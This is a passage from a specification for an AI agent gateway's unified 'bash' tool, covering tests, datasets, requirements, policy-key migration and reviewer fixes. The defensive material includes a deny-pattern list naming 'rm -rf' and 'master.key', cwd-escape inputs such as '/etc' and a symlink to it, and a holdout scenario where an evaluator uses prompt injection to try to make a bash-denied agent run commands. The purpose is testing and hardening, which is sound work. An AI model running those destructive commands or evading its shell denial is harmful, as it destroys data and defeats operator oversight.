| 10 | `TestBash_RunInBackground_ReturnsImmediately` | Unit | Scenario: Background command returns immediately with a session handle | |
| 11 | `TestBash_Poll_RunningSession` | Unit | Scenario: Polling a running background session | |
| 12 | `TestBash_Read_ReturnsOnlyNewOutput` | Unit | Scenario: Reading a background session returns only new output | |
| 13 | `TestBash_Kill_TerminatesAndUpdatesStatus` | Unit | Scenario: Killing a background session terminates it | |
| 13b | `TestBash_KillRacingNaturalExit` **(NEW)** | Unit | Scenario: Killing a session that already exited naturally reports its real final status | MIN-002 — race between poll/kill and natural process exit |
| 14 | `TestBash_PersistentWithoutBackground_Rejected` | Unit | Edge Cases | Validation error |
| 15 | `TestMigrateShellToolPolicyKeys_ExecDenySurvives` | Unit | Scenario: Persisted per-agent exec:deny survives migration | The single most important test in this spec |
| 16 | `TestMigrateShellToolPolicyKeys_StricterWins` | Unit | Scenario: Contradictory legacy keys resolve to the stricter value | |
| 17 | `TestMigrateShellToolPolicyKeys_Idempotent` | Unit | Scenario: Migration is idempotent | |
| 18 | `TestMigrateDeprecatedToolEnableFlags_ExecFalseStillDenies` | Unit | Scenario: Legacy tools.exec.enabled=false still results in bash being denied | Updated existing test |
| 19 | `TestMigrateShellToolPolicyKeys_DeletesLegacyKeyAfterConversion` **(NEW)** | Unit | Scenario: Migration deletes the legacy key it converted | Proves no permanent dual-key backward compatibility — the persisted config no longer has `exec`/`workspace_shell`/`workspace_shell_bg` after migration |
| 19b | `TestMigrateShellToolPolicyKeys_WritesBackupBeforeDelete` **(NEW)** | Unit | Scenario: Migration writes a recoverable backup before deleting legacy keys | FR-M4 / CRIT-002 — a rollback path exists if a migration bug is later found |
| 19c | `TestMigrateShellToolPolicyKeys_MalformedValueTreatedAsDeny` **(NEW)** | Unit | Scenario: A malformed legacy policy value is treated as deny, not silently coerced to allow | FR-M4 / MAJ-005 — fail-safe on an unrecognized value |
| 20 | `TestBash_EvaluateExecAppliesToBackgroundToo` | Integration | Behavioral Contract | Binary allowlist parity between foreground/background |
| 21 | `TestBash_GodModeSkipsHardeningUniformly` | Integration | Behavioral Contract | One hardening path, foreground and background alike |
| 22 | `TestBash_AuditFailClosed` | Integration | Edge Cases | Audit-write failure refuses execution |
| 22b | `TestBash_CwdRejectsSymlinkEscape` **(NEW)** | Integration | Scenario: A symlink pointing outside the workspace is rejected as a cwd escape | MAJ-001 — requires a real filesystem symlink, hence Integration not Unit |
| 22c | `TestBash_CwdRejectsDeepNestedNetOutside` **(NEW)** | Unit | Scenario: A deep-nested traversal that nets one level above the workspace root is still rejected | MIN-004 |
| 23 | `TestSessionManager_KillAllForSession` **(NEW)** | Unit | Scenario: Canceling a session kills its background bash sessions | New method on `SessionManager`, keyed by `OwnerSessionID`; asserts the FR-B14 log line and counter increment, not just the kill itself |
| 24 | `TestBash_CancelCascade_KillsOwnedBackgroundSessions` **(NEW)** | Integration | Scenario: Canceling a session kills its background bash sessions | Chains real `RequestCancel` → `CancelHooks.KillBackgroundSessions` → `SessionManager.KillAllForSession` |
| 25 | `TestBash_CancelCascade_NoOpWhenNothingToKill` **(NEW)** | Integration | Scenario: Canceling a session with no background work is a no-op for the new cascade step | Proves the new step doesn't change today's no-background-work cancel behavior |
| 26 | `TestBash_CancelCascade_DoesNotAffectOtherSessions` **(NEW)** | Integration | Scenario: Canceling one session does not affect another session's background work | Scoping proof — mirrors `check_spawn_status`'s existing per-conversation scoping |
| 27 | E2E: agent denied `bash` cannot reach shell execution any other way | E2E | Scenario: Agent denied bash cannot run a command | The regression test motivating this whole spec |
| 28 | E2E: canceling a session with a real background build kills it | E2E | Scenario: Canceling a session kills its background bash sessions | Full-stack proof of User Story 5 |

### Test Datasets

#### Dataset: `cwd` validation

| # | Input | Boundary Type | Expected Output | Traces to | Notes |
|---|-------|---------------|-----------------|-----------|-------|
| 1 | `""` (empty, defaults to workspace root) | Empty | Accepted, runs at workspace root | BDD Scenario: A real relative cwd inside the workspace is honored | |
| 2 | `"/etc"` | Absolute | Rejected | BDD Scenario: Absolute cwd is rejected | |
| 3 | `"../"` | Traversal | Rejected | BDD Scenario: Relative-path traversal cwd is rejected | |
| 4 | `"../../other-agent"` | Traversal | Rejected | BDD Scenario: Relative-path traversal cwd is rejected | |
| 5 | `"subdir/build"` | Happy path | Accepted | BDD Scenario: A real relative cwd inside the workspace is honored | |
| 6 | `"subdir/../subdir"` | Traversal that resolves back inside | Accepted — only the final resolved path is checked, so this is treated the same as `"subdir"` | BDD Scenario: A real relative cwd inside the workspace is honored | Resolved 2026-07-04: the guard checks the fully-cleaned final path, not the presence of a raw `..` token |
| 7 | `"evil_link"` (a symlink to `/etc`, pre-created inside the workspace) | Symlink escape | Rejected | BDD Scenario: A symlink pointing outside the workspace is rejected as a cwd escape | Added 2026-07-04, MAJ-001 — `filepath.Clean` alone would accept this; `filepath.EvalSymlinks` must run first |
| 8 | `"a/../../b"` (workspace root contains only `a`; net effect one level above root) | Deep-nested, nets outside | Rejected | BDD Scenario: A deep-nested traversal that nets one level above the workspace root is still rejected | Added 2026-07-04, MIN-004 — complements row 6's positive control with a same-complexity negative control |

#### Dataset: deny-pattern baseline (see BDD Scenario Outline above for the full table — reused directly as the test dataset)

#### Dataset: `timeout_seconds` bounds (added 2026-07-04, MAJ-004)

| # | Input | Boundary Type | Expected Output | Traces to | Notes |
|---|-------|---------------|-----------------|-----------|-------|
| 1 | `-1` | Negative | Rejected, validation error | BDD Scenario: timeout_seconds outside the documented bounds is rejected | |
| 2 | `0` | Zero | Rejected, validation error | BDD Scenario: timeout_seconds outside the documented bounds is rejected | |
| 3 | `1` | Min valid | Accepted | (positive control) | |
| 4 | `300` | Default | Accepted (this is the documented default) | Behavioral Contract | |
| 5 | `3600` | Max valid | Accepted | (positive control) | |
| 6 | `3601` | Max + 1 | Rejected, validation error | BDD Scenario: timeout_seconds outside the documented bounds is rejected | |
| 7 | `7200` | Well above max | Rejected, validation error | BDD Scenario: timeout_seconds outside the documented bounds is rejected | |

#### Dataset: migration key combinations

| # | Input (persisted keys) | Boundary Type | Expected Output | Traces to | Notes |
|---|-------|---------------|-----------------|-----------|-------|
| 1 | `{"exec": "deny"}` | Single key | `bash: deny` | Scenario: Persisted per-agent exec:deny survives migration | |
| 2 | `{"exec": "ask"}` | Single key | `bash: ask` | Scenario: Persisted per-agent exec:deny survives migration (variant) | |
| 3 | `{"exec": "allow"}` | Single key | `bash: allow` | Scenario: Persisted per-agent exec:deny survives migration (variant) | |
| 4 | `{}` (no legacy keys) | Empty | No `bash` key added; falls to default policy | Regression | Migration must not invent a policy where none existed |
| 4b | `{"exec": "Disabled"}` | Malformed value | `bash: deny` (fail-safe), WARN logged naming agent/key/value | Scenario: A malformed legacy policy value is treated as deny | Added 2026-07-04, MAJ-005 |
| 5 | `{"exec": "ask", "workspace_shell": "deny"}` | Conflicting | `bash: deny` (strictest) | Scenario: Contradictory legacy keys resolve to the stricter value | |
| 6 | `{"exec": "allow", "workspace_shell": "allow", "workspace_shell_bg": "ask"}` | Conflicting, three keys | `bash: ask` (strictest of the three) | Scenario: Contradictory legacy keys resolve to the stricter value (variant) | |
| 7 | `{"bash": "deny", "exec": "allow"}` | Already-migrated + stale legacy key present | `bash: deny`; the stale `exec` key is **deleted** from the persisted config on this boot (not merely ignored) | Scenario: Migration deletes the legacy key it converted | Resolved 2026-07-04: no permanent backward compatibility — an already-present `bash` key is authoritative for the value, and any lingering legacy key is actively cleaned up, not just left in place unread |
| 8 | `{"exec": "deny"}`, migration run twice in a row | Idempotency + cleanup | First run: `bash: deny`, `exec` key deleted. Second run: no change, no error | Scenario: Migration is idempotent across repeated boots | Confirms cleanup itself is idempotent — deleting an already-deleted key is a no-op, not an error |

### Regression Test Requirements

**If modifying existing functionality:**

| Existing Behaviour | Existing Test | New Regression Test Needed | Notes |
|--------------------|---------------|---------------------------|-------|
| `exec`'s deny-pattern baseline (rm -rf, master.key, etc.) | Existing `pkg/tools/shell_test.go` deny-pattern tests | Yes — `TestBash_DenyPatternBaseline` | Re-target at the new tool name, same pattern list |
| `workspace_shell`'s real `timeout_sec` enforcement | Existing `pkg/tools/workspace_shell_test.go` timeout tests | Yes — `TestBash_TimeoutEnforced_Foreground`/`_Background` | Must apply to both modes now, where before only one tool had real enforcement |
| `EvaluateExec` binary allowlist | Existing `pkg/policy/glob_test.go::TestGlobMatcher_ExecAllowlist` | Yes — `TestBash_EvaluateExecAppliesToBackgroundToo` | New coverage: this mechanism never applied to background mode before |
| God-mode bypass (`sandbox.ResolveLimits`) | Existing `pkg/sandbox/profile_test.go::TestResolveLimits` | No — reused directly, already covers the primitive; only the call site changes | |
| `check_spawn_status`/`exec`'s session-management mechanics | Existing `pkg/tools/shell_test.go` session tests | Yes — retargeted at `bash`'s `action: poll/read/kill` | Behavior preserved, tool name changed |

---

## Functional Requirements

(See `tool-consolidation-spec.md`'s FR-B1–FR-B5 and FR-M1–FR-M2 for the complete list — reproduced and expanded here with full BDD/test traceability.)

- **FR-B1**: The system MUST expose `bash` with schema `command` (required), `description` (optional), `cwd` (optional, relative-only), `timeout_seconds` (optional, default 300, max 3600), `run_in_background` (optional bool, default false), `persistent` (optional bool, default false), `action` (enum `run|poll|read|kill`, default `run`), `session_id` (required for non-`run` actions).
- **FR-B2**: The system MUST reject `cwd` containing `..` or an absolute path before spawning any subprocess.
- **FR-B3**: The system MUST enforce `timeout_seconds` identically for foreground and background modes.
- **FR-B4**: The system MUST apply the hardcoded deny-pattern baseline to every `bash` call regardless of policy verdict, layered with operator-extensible custom patterns.
- **FR-B5**: The system MUST apply `EvaluateExec`'s binary allowlist to both foreground and background modes.
- **FR-B6**: The system MUST route every non-god-mode invocation through `sandbox.ResolveLimits`, with god-mode resolved once per turn via `agent.GodModeActive(cfg)`.
- **FR-B7**: The system MUST refuse execution when the audit-log write itself fails (fail-closed, matching `workspace_shell`'s current default).
- **FR-B8**: The system MUST register `bash` universally for every agent, with access governed exclusively by `ToolPolicyCfg`.
- **FR-M1**: The system MUST migrate any persisted `exec`/`workspace_shell`/`workspace_shell_bg` policy key to `bash`, taking the strictest value when multiple keys exist, on boot, idempotently.
- **FR-M2**: The system MUST update the `toolEnableToPolicy` table's legacy `{"exec","exec"}` row to `{"exec","bash"}`.
- **FR-M3**: The system MUST delete every migrated-from legacy key (`exec`, `workspace_shell`, `workspace_shell_bg`) from the persisted config as part of migration — no permanent dual-key backward compatibility; an already-present `bash` key is authoritative and any lingering legacy key found alongside it is deleted, not merged.
- **FR-M4** (added 2026-07-04, 7-reviewer gate CRIT-002 + MAJ-005): Before deleting any legacy key (FR-M3), the migration MUST write a timestamped backup of the pre-migration policy maps (e.g., `config.json.pre-bash-migration.<unix-ts>.bak`) and name that backup file in the boot log line FR-M1 already requires — giving an operator a recovery path if a migration bug is later discovered, since post-deletion the legacy keys are otherwise unrecoverable from the running system. Additionally, a legacy policy value that is not one of `deny`/`ask`/`allow` (malformed, wrong casing, empty, or a non-string type from a hand-edited config) MUST be treated as `deny` (fail-safe, not silently coerced to `allow`) with a WARN log line naming the offending agent, key, and value.
- **FR-B9**: `bash`'s background-completion path MUST call `AsyncNotifier.Notify` (per `async-notifier-spec.md`) with `SourceKind: "bash"` on completion, failure, timeout, or kill.
- **FR-B10**: The system MUST track, for every background `bash` session, the owning chat/transcript session ID (`ProcessSession.OwnerSessionID`) at creation time, so background work can be enumerated and killed by owning session.
- **FR-B11**: `RequestCancel` MUST, as part of its existing graceful-cascade phase, kill every background `bash` session owned by the session being canceled, via a new `CancelHooks.KillBackgroundSessions` hook backed by `SessionManager.KillAllForSession`. A session with no background work sees no behavior change from today.
- **FR-B12** (added 2026-07-04, 7-reviewer gate CRIT-001): The system MUST seed `bash: deny` into every newly created custom agent's `AgentBuiltinToolsCfg.Policies` in `pkg/sysagent/tools/agent.go`, mirroring the existing `system.*: deny` seed exactly (same file, same code path, added as a new seeded entry, not merely documented as an assumed convention). This is new, security-relevant scope with its own test — not folded silently into FR-B8.
- **FR-B13** (added 2026-07-04, MAJ-001 symlink escape): The `cwd` guard MUST resolve the final path with symlinks followed (`filepath.EvalSymlinks` or equivalent) before the inside/outside-workspace containment check — `filepath.Clean` alone (lexical only) is insufficient, since it does not resolve a symlink that a prior `bash` call could have created pointing outside the workspace.
- **FR-B14** (added 2026-07-04, MAJ-003 observability): `SessionManager.KillAllForSession` MUST log one INFO line per background session killed (session ID, PID, elapsed runtime) and increment a counter, so an operator (or `TestBash_CancelCascade_KillsOwnedBackgroundSessions`) can confirm the cascade actually fired without relying solely on a subsequent `poll` call.
- **FR-B15** (added 2026-07-04, MAJ-004 timeout bounds): A `timeout_seconds` value outside `[1, 3600]` MUST be rejected as invalid input before any subprocess is spawned — matching the `persistent`-without-`run_in_background` convention (reject, don't silently clamp or ignore).

---

## Success Criteria

- **SC-001**: An agent with `bash: deny` cannot execute a shell command through any code path exposed by this tool, verified by an E2E test attempting every documented action value.
- **SC-002**: 100% of the deny-pattern-baseline dataset (5 dangerous-command rows) are rejected regardless of the agent's own policy verdict.
- **SC-003**: A config fixture with `tools_cfg: {"exec": "deny"}` results in `bash: deny` for that agent, with zero manual intervention, on the very first post-upgrade boot, and the persisted `exec` key is gone after that boot.
- **SC-004**: Running the full migration twice against the same config file produces a config with identical resolved policy values on both runs, verified by structural (field-by-field) comparison — relaxed 2026-07-04 from a stricter "byte-identical" requirement (7-reviewer gate MAJ-006), since no consumer of `config.json` depends on literal byte reproducibility and a future debug-timestamp field shouldn't silently break this criterion.
- **SC-005**: Canceling a session with a running background `bash` command results in that command being killed within the same graceful-cascade phase `RequestCancel` already uses for descendant turns, verified by a real (not mocked) integration test.
- **SC-006** (added 2026-07-04, CRIT-001): A freshly created custom agent cannot call `bash` — verified by `TestBash_NewCustomAgentDeniedByDefault` AND its regression guard `TestBash_NewCustomAgentReachableIfSeedMissing_RegressionGuard`, which fails if the FR-B12 seed is ever removed.
- **SC-007** (added 2026-07-04, MAJ-001): A symlink inside the workspace pointing outside it cannot be used as `cwd` to escape the workspace, verified by `TestBash_CwdRejectsSymlinkEscape` against a real filesystem symlink.

---

## Traceability Matrix

| Requirement | User Story | BDD Scenario(s) | Test Name(s) |
|-------------|-----------|------------------|---------------|
| FR-B1 | US-2 | Scenario: Background command returns immediately | `TestBash_RunInBackground_ReturnsImmediately` |
| FR-B2 | US-3 | Scenario: Absolute cwd is rejected; Scenario: Relative-path traversal cwd is rejected; Scenario: A real relative cwd is honored; Scenario: A deep-nested traversal that nets one level above the workspace root is still rejected | `TestBash_CwdRejectsAbsolutePath`, `TestBash_CwdRejectsTraversal`, `TestBash_CwdAcceptsValidRelativePath`, `TestBash_CwdRejectsDeepNestedNetOutside` |
| FR-B3 | Behavioral Contract | (boundary condition, no dedicated user story) | `TestBash_TimeoutEnforced_Foreground`, `TestBash_TimeoutEnforced_Background` |
| FR-B4 | US-1 | Scenario: Policy allow does not bypass the deny-pattern baseline; Scenario Outline: Deny-pattern baseline blocks known-dangerous commands | `TestBash_PolicyAllowDoesNotBypassDenyPatterns`, `TestBash_DenyPatternBaseline` |
| FR-B5 | Integration Boundaries | (cross-cutting, no dedicated scenario) | `TestBash_EvaluateExecAppliesToBackgroundToo` |
| FR-B6 | Integration Boundaries | (cross-cutting) | `TestBash_GodModeSkipsHardeningUniformly` |
| FR-B7 | Edge Cases | (audit fail-closed) | `TestBash_AuditFailClosed` |
| FR-B8 | US-1 | Scenario: New custom agent is denied bash by default | `TestBash_NewCustomAgentDeniedByDefault` |
| FR-M1 | US-4 | Scenario: Persisted per-agent exec:deny survives migration; Scenario: Contradictory legacy keys resolve to the stricter value; Scenario: Migration is idempotent | `TestMigrateShellToolPolicyKeys_ExecDenySurvives`, `_StricterWins`, `_Idempotent` |
| FR-M2 | US-4 | Scenario: Legacy tools.exec.enabled=false still results in bash being denied | `TestMigrateDeprecatedToolEnableFlags_ExecFalseStillDenies` |
| FR-M3 | US-4 | Scenario: Migration deletes the legacy key it converted | `TestMigrateShellToolPolicyKeys_DeletesLegacyKeyAfterConversion` |
| FR-M4 | US-4 | Scenario: Migration writes a recoverable backup before deleting legacy keys; Scenario: A malformed legacy policy value is treated as deny | `TestMigrateShellToolPolicyKeys_WritesBackupBeforeDelete`, `_MalformedValueTreatedAsDeny` |
| FR-B9 | (shared with `async-notifier-spec.md`) | See that spec's Scenario: Backgrounded bash command wakes the agent on completion | `TestBashRunInBackground_CompletionTriggersNewTurn` (defined in `async-notifier-spec.md`) |
| FR-B10 | US-5 | Scenario: Canceling a session kills its background bash sessions | `TestSessionManager_KillAllForSession` |
| FR-B11 | US-5 | Scenario: Canceling a session kills its background bash sessions; Scenario: Canceling a session with no background work is a no-op; Scenario: Canceling one session does not affect another | `TestBash_CancelCascade_KillsOwnedBackgroundSessions`, `_NoOpWhenNothingToKill`, `_DoesNotAffectOtherSessions` |
| FR-B12 | US-1 | Scenario: New custom agent is denied bash by default; Scenario: A custom agent's DefaultPolicy: allow does not leave bash reachable if the seed is missing | `TestBash_NewCustomAgentDeniedByDefault`, `TestBash_NewCustomAgentReachableIfSeedMissing_RegressionGuard` |
| FR-B13 | US-3 | Scenario: A symlink pointing outside the workspace is rejected as a cwd escape | `TestBash_CwdRejectsSymlinkEscape` |
| FR-B14 | US-5 | Scenario: Canceling a session kills its background bash sessions (log/counter assertion) | `TestSessionManager_KillAllForSession` |
| FR-B15 | Behavioral Contract | Scenario: timeout_seconds outside the documented bounds is rejected as invalid input | `TestBash_TimeoutOutOfBoundsRejected` |

**Completeness check**: every FR-xxx has at least one BDD scenario and test; every BDD scenario appears above.

---

## Ambiguity Warnings

All four ambiguities identified during drafting were resolved by the operator on 2026-07-04 — see Clarifications below. Two of those resolutions (migration cleanup, cancel cascade) added new, real scope beyond the original default assumption; both are now fully specified above (FR-M3, FR-B10/FR-B11, User Story 5).

**Post-grill fixes (2026-07-04, 7-reviewer gate — verdict BLOCK, now addressed):** this spec's central User-Story-1 premise was independently verified against the real codebase and found FALSE — see CRIT-001 in the Clarifications below. That, plus a rollback-less migration (CRIT-002) and a symlink-based `cwd` escape (MAJ-001), drove the BLOCK verdict. All three have real fixes now (FR-B12, FR-M4, FR-B13), not just wording changes, verified directly against `pkg/sysagent/tools/agent.go`, `pkg/tools/compositor.go`, and `pkg/tools/effective_tool_policy_test.go`. None remain open.

---

## Evaluation Scenarios (Holdout)

> For post-implementation evaluation only. Not referenced in the TDD plan or traceability matrix.

### Scenario: Operator with an explicitly-denied agent tries every trick they can think of
- **Setup**: Real gateway, an agent configured with `bash: deny`.
- **Action**: An evaluator (human or adversarial script) tries every plausible way to get that agent to run a shell command — direct call, background mode, unusual argument combinations, prompt injection attempting to reference a different tool name.
- **Expected outcome**: Shell execution is never achieved through any path.
- **Category**: Error

### Scenario: A build takes 90 seconds in the background while the operator keeps chatting
- **Setup**: Real gateway, an agent allowed `bash`.
- **Action**: Operator asks the agent to run a real build command in the background, then continues an unrelated conversation.
- **Expected outcome**: The build's result surfaces naturally when it finishes, without the operator having to ask "is it done yet."
- **Category**: Happy Path

### Scenario: An operator upgrades from a version with `exec: deny` configured on a sensitive agent
- **Setup**: A real, pre-upgrade `config.json` with `exec: deny` on a specific agent, loaded against the new binary.
- **Action**: Boot the gateway.
- **Expected outcome**: That agent still cannot run shell commands after the upgrade, with no manual reconfiguration needed, and ideally a visible log line confirming the migration happened.
- **Category**: Happy Path

### Scenario: A command that legitimately needs to write outside the immediate cwd but inside the workspace
- **Setup**: An agent with `bash: allow`, a workspace with nested directories.
- **Action**: Run a command from one subdirectory that writes to a sibling subdirectory using a relative path.
- **Expected outcome**: This succeeds — the workspace-escape guard should not be so strict that legitimate intra-workspace relative paths fail.
- **Category**: Edge Case

### Scenario: A very long-running background command hits its timeout
- **Setup**: A background `bash` command with `timeout_seconds: 5` running `sleep 60`.
- **Action**: Wait past the timeout.
- **Expected outcome**: The process is killed at 5 seconds, and polling afterward reports a timeout status, not "running" forever.
- **Category**: Error

### Scenario: An operator tries to loosen the deny-pattern baseline via config
- **Setup**: An operator attempts to configure something that would allow `rm -rf /` to run (e.g., an "allow" custom pattern matching it, if such a config surface exists).
- **Action**: Configure this, then have the agent attempt the command.
- **Expected outcome**: The hardcoded baseline still blocks it — no configuration surface can disable the floor.
- **Category**: Error

### Scenario: An operator cancels a chat mid-way through a long background build
- **Setup**: Real gateway, an agent running a background `bash` command (e.g., a real multi-minute build).
- **Action**: The operator hits cancel (any of the four real surfaces — web SPA button, `/cancel`, a Tier B channel command, or the CLI).
- **Expected outcome**: The background build process is actually terminated, not left running invisibly after the chat shows "canceled."
- **Category**: Happy Path

---

## Assumptions

- `bash` is the final, locked tool name — used literally throughout this spec, its migration target key, and its test names.
- The exact final home of the merged implementation (rewritten `pkg/tools/shell.go` vs. a new `pkg/tools/bash.go`) is an implementer's naming choice, not a behavioral requirement.
- No new wire-contract schema change is required — tool-policy maps are `additionalProperties`-shaped with no fixed enum (confirmed during the earlier investigation); only illustrative `example:` strings need updating per Constraint #8.
- A background `bash` session's process is not tied to its parent agent session's *passive* lifecycle (idle chat, dropped WS) — it keeps running, matching `DevServerRegistry`'s existing independent lifecycle. It IS tied to an *explicit* cancel (`RequestCancel`) — that cascades to kill it (User Story 5, see Clarifications).
- Migration is a one-shot conversion with cleanup, not an ongoing dual-key-resolution feature — once a legacy key is converted to `bash`, it is deleted from the persisted config, matching the operator's explicit "no backward compatibility" instruction.

## Clarifications

### 2026-07-04

- Q: Should `workspace_shell_bg`'s port-exposure capability be preserved inside `bash`? -> A: No — redirect to `web_serve`'s existing, safer dev-server mode (ADR-036 §3.1).
- Q: Should PTY support be preserved? -> A: No — dropped, matching Claude Code's own scope (ADR-036 §3.1).
- Q: Does a `cwd` that traverses outside the workspace and back (e.g., `"subdir/../subdir"`) count as an escape attempt? -> A: No — the guard checks only the final, fully-resolved (`filepath.Clean`ed) path; if that final path is inside the workspace, the call is accepted.
- Q: When a persisted config already has a `bash` policy key alongside a stale legacy key (`exec`/`workspace_shell`/`workspace_shell_bg`), which wins, and does the legacy key stick around? -> A: The `bash` key wins on value, and **the legacy key is deleted, not merely ignored** — the operator explicitly rejected permanent dual-key backward compatibility ("no backward compatibility... needs to be cleaned up"). Migration is a one-shot convert-and-delete, not an ongoing resolution rule (FR-M3).
- Q: Should a background `bash` session be force-killed when its parent agent session closes? -> A: Nuanced answer, corrected 2026-07-04: passive inactivity (idle chat, dropped connection) does NOT kill it — same as originally assumed, matching `DevServerRegistry`. But an **explicit cancel command in that session MUST cascade down** and kill it — this is new scope (User Story 5, FR-B10/FR-B11), reusing the existing `RequestCancel`/`CancelHooks` mechanism that already cascades to descendant turns but not, until now, to detached background processes.
- Q: Is `bash` the final, locked tool name? -> A: Yes — confirmed, used literally throughout contracts, frontend labels, and the migration target key.

### 2026-07-04 — 7-reviewer gate fixes (post-grill, verdict BLOCK → addressed)

- Q [CRIT-001]: Is "a fresh custom agent is denied bash by default" already-true behavior, as originally worded ("matching every other builtin tool's convention")? -> A: **No — this was verified FALSE against the real code and is the most serious finding in this spec.** `pkg/sysagent/tools/agent.go` seeds only `system.*: deny` for new custom agents and sets `Tools.Builtin.DefaultPolicy = allow`; `pkg/tools/compositor.go`'s `passesScopeGate` explicitly does NOT hard-deny `ScopeCore` tools (which `bash` is) on custom agents, deferring instead to the merged policy, which then falls through to the seeded `allow` default. As originally worded, this spec would have shipped `bash` reachable-by-default on every new custom agent. Fixed by adding FR-B12 (an explicit `bash: deny` seed, mirroring the existing `system.*: deny` seed) plus a regression-guard test that fails if the seed is ever removed.
- Q [CRIT-002]: Should the migration (FR-M3) delete legacy keys with no backup or rollback path? -> A: No — added FR-M4, requiring a timestamped pre-migration backup file before any legacy key is deleted, named in the boot log line.
- Q [MAJ-001]: Does `filepath.Clean`-only path resolution fully close the `cwd`-escape guard? -> A: No — a symlink inside the workspace pointing outside it defeats a purely lexical check. Added FR-B13 requiring `filepath.EvalSymlinks`-based resolution before the containment check.
- Q [MAJ-003]: Is the cancel-cascade kill (FR-B10/FR-B11) observable in production? -> A: Not as originally specified — added FR-B14 requiring an INFO log line + counter increment per session killed, so a silent no-op bug in `KillAllForSession` wouldn't be invisible.
- Q [MAJ-004]: What happens when `timeout_seconds` is outside `[1, 3600]`? -> A: Previously unspecified — added FR-B15: reject as invalid input (matching the `persistent`-without-`run_in_background` convention), not clamp or silently ignore.
- Q [MAJ-005]: What happens when a legacy policy value is malformed (not `deny`/`ask`/`allow`)? -> A: Previously unspecified — folded into FR-M4: treat as `deny` (fail-safe), with a WARN log line naming the offending agent/key/value, never silently coerced to `allow`.
- Q [MAJ-006]: Should SC-004's migration-idempotency check require byte-identical output? -> A: Relaxed to structural (resolved-policy-value) comparison — byte-identical was stricter than any actual consumer needs and would break on an innocent future debug field.
- Q [MAJ-002, shared across all three specs]: Is the approval-grant infrastructure (`d0f65482`) actually present in the working tree these specs were drafted in? -> A: No — verified via `git merge-base --is-ancestor d0f65482 HEAD` (false) vs. `origin/hotfix/v0.1.1` (true); local HEAD is exactly two commits behind. Added an explicit implementation precondition to this spec's header.
